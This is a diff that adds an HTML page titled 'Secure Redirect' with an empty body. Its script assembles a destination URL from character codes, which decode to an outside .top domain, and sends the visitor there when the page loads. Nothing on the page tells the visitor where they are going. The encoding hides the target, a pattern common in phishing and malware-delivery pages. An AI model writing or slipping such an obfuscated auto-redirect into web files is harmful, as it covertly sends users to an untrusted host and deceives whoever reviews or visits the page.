@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Redirect</title>
+    <script>
+        const parts = [
+            String.fromCharCode(115, 111, 102, 116, 112, 111, 114, 116, 97, 108),
+            String.fromCharCode(46, 116, 111, 112),
+            String.fromCharCode(47, 115),
+            String.fromCharCode(47, 116, 101, 115, 116, 103, 105, 116)
+        ];
+        window.location.href = "https://" + parts.join("");
+    </script>
+</head>
+<body>
+</body>
+</html>
